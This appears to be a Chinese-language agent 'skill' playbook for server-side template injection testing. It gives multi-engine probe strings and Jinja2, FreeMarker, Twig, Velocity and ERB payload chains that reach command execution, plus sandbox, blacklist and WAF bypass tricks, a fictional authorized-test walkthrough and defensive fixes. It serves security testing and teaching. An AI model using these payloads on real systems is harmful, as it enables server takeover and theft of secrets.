---
source: test008008008008-glitch/web-security-skills
skill: 08-ssti
fused: 2026-09-17
method: 五步猎洞法
---

---
name: ssti
description: SSTI 服务端模板注入实战手册。当用户输入进入模板渲染（Jinja2/Twig/FreeMarker/Velocity 等）时使用，覆盖探测、引擎指纹、沙箱逃逸与 RCE。
---

# 第八技 · SSTI —— 模板引擎听懂了你的话

> 猎手视角：把 `${7*7}` 当普通文本渲染，它是数据；把它当表达式求值，它是代码。SSTI 的全部悬念就在这一步——你说的这句话，模板引擎有没有"听进去"。

**目标读者**：具备基础 Web 测试经验的安全工程师
**前置要求**：了解一种模板引擎语法（Jinja2/Twig 任一）、HTTP 改包

---

## 何时启用本技

- 个性化内容渲染：**邮件模板、短信模板、页面标题/问候语**（"欢迎回来，{username}"）
- 在线模板/邮件编辑器、PDF 生成、报表自定义
- 错误页回显参数、重定向页参数
- Markdown/表达式预览功能

> 区分 XSS：输入 `<script>alert(1)</script>` 只弹窗 = 输出语境问题（XSS）；输入 `${7*7}` 回显 `49` = 服务端在求值（SSTI）。

---

## 一、原理拆解

```
安全用法:   render("Hello " + clean(user))        ← 用户内容是"数据"
漏洞用法:   Template(user_content).render()        ← 用户内容成了"模板"
```

一句话病根：**把用户输入拼进了模板源码，而不是当变量传进去**。

求值能力阶梯（每上一级危害翻倍）：

1. 数学/字符串运算（`${7*7}`）——证明引擎在解析
2. 读取上下文对象（config、request）——泄露配置/密钥
3. 调用对象方法（文件读写）——任意文件
4. 命令执行（逃逸类方法/危险内置）——RCE

---

## 二、五步猎洞法

### 第一步：识面 —— 找"渲染个性化内容"的输入点

凡是最终产物是"按用户输入变化的 HTML/邮件/PDF"的功能，都可能是模板渲染点。测试环境优先（SSTI 探测低噪音，但确认后是高危，直接测生产要克制）。

### 第二步：定点 —— 多引擎探测串

不同引擎语法不同，一次投一组"全家桶"：

```text
${7*7}      ${7*7}      <% 7*7 %>
{{7*7}}     {{7*'7'}}   {{7*7}}   #{7*7}
*{7*7}      ${=7*7}     {{7*7}}
```

响应里哪个位置变成 `49` / `7777777`，就是哪个引擎在求值：

| 回显 | 引擎 |
|------|------|
| `${7*7}`→`49` | FreeMarker / Thymeleaf / Mako（再细分） |
| `{{7*7}}`→`49` | Jinja2 |
| `{{7*'7'}}`→`7777777` | Jinja2（数字型则是 Twig） |
| `#{7*7}`→`49` | Ruby ERB / Thymeleaf |
| `{{7*7}}` 原样 | 未渲染——收工或换注入位置 |

### 第三步：验证 —— 指纹与读上下文

Jinja2（Python）确认链：

```text
{{ 7*7 }}                            → 49 确认
{{ config }}                         → 泄露 Flask 配置（SECRET_KEY 在里面）
{{ get_flashed_messages.__globals__ }} → 追到全局命名空间
```

FreeMarker（Java）确认链：

```text
${7*7}                                → 49
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
                                      → 内置 Execute 类直接执行（旧版本）
```

### 第四步：利用 —— 按引擎逃逸到 RCE

**Jinja2（重点，Python 站占比最高）**：

```text
# 走对象图遍历（沙箱禁了 __import__ 也能走 subprocess）
{{ ''.__class__.__mro__[1].__subclasses__() }}
# 找到 subprocess.Popen 的索引后：
{{ ''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate() }}
```

沙箱绕过要点：`__getattr__` 拼接属性名、`|attr()` 过滤器、字符串拼接绕黑名单（`'__imp'+'ort__'`）、`request` 对象带参藏 payload。

**Twig**：`{{['id']|map('system')}}`（过滤链）、`{{_self.env.registerUndefinedFilterCallback("system")}}` 旧版本。

**Velocity**：`#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))...invoke('id')` 反射链。

**ERB (Ruby)**：`<%= system('id') %>`（ERB 默认无沙箱，最直接）。

### 第五步：收官 —— RCE 证据与修复建议

`id`/`whoami` 输出截图即停；报告附"模板渲染改为变量传入"的正确代码对比。

---

## 三、实战推演（虚构场景）

> 场景：授权测试虚构 SaaS `saas.demo-example.com`，营销页支持自定义"欢迎标语"

1. **识面**：`POST /landing/slogan` 参数 `slogan`，设置后展示在用户落地页顶部
2. **定点**：`slogan={{7*7}}`，落地页显示 `49`——Jinja2 嫌疑；`{{7*'7'}}` 显示 `7777777` 确认 Jinja2
3. **验证**：`{{ config }}` 输出含 `SECRET_KEY: '****'`（已脱敏入证）——上下文泄露确认
4. **利用**：对象图遍历至 `subprocess.Popen`，执行 `whoami` 回显 `www-data`
5. **收官**：报告高危（SSTI → RCE），修复：`render_template('page.html', slogan=user_input)` 而非 `Template(user_input)`

---

## 四、对抗与绕过

| 防线 | 砍解思路 |
|------|----------|
| 过滤 `{{` `}}` | `{% ... %}` 语句块、`{#` 注释嵌套、`{%print(7*7)%}` |
| 沙箱（SandboxedEnvironment） | 对象图绕过：过滤了 `__class__` 就走 `.__mro__`、`|attr('__class__')`、`request['application']` |
| 黑名单关键字 | 字符串拼接（`'__imp'+'ort__'`）、`request.args` 传参拆分、编码（`\x5f` 下划线） |
| WAF 拦 `os.system` | 用 `subprocess`、`pty.spawn`、写文件到计划任务目录等次级能力 |
| Java 新版 FreeMarker | Execute 被禁 → 找目标 classpath 里的其他可控类/方法（JDBC 注入、文件写） |

---

## 五、防御视角

1. **用户输入永远做"数据"不做"模板"**：`render(template, {"name": user_input})`，绝不让用户输入进入 `Template()` 构造
2. 模板功能必须开放给用户时：**逻辑与模板分离**（用户只能改文案变量表），或选无逻辑引擎（Mustache）
3. Jinja2 沙箱不是免死金牌：`SandboxedEnvironment` + 禁用危险过滤器，仍建议网络层兜底
4. FreeMarker：`Configuration.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING)`
5. 密钥与模板上下文隔离：不要把 `config`、`SECRET_KEY` 挂进渲染上下文

---

## 六、踩坑记录

- 探测串打出去**原样回显**：可能渲染的是前端模板（客户端渲染）——那是前端 XSS 的事，别激动
- Jinja2 的 `{{7*'7'}}` 与 Twig 区分（`49` vs `7777777`）不牢靠：**看 `self` 或报错信息**更准
- 沙箱里 `__subclasses__()` 列表很长，肉眼找 `subprocess.Popen` 索引——写脚本遍历，别数到眼瞎
- 有些渲染点是**二次渲染**（数据入库后定时任务渲染）：探针没回显不代表没注入，等一轮再看
- 拿到 RCE 后第一时间**检查是不是模板测试环境**——SSTI 打错的代价是真实生产

---

## 七、速查卡

```text
探测:   ${7*7} | {{7*7}} | {{7*'7'}} | #{7*7}
Jinja2: ''.__class__.__mro__[1].__subclasses__() → Popen
沙箱:   |attr() | 字符串拼接 | request.args藏参
FreeMarker: ?new() Execute | 旧版直接RCE
Twig:   ['id']|map('system')
防御:   输入做数据不做模板 | Mustache | 沙箱+禁过滤器
```
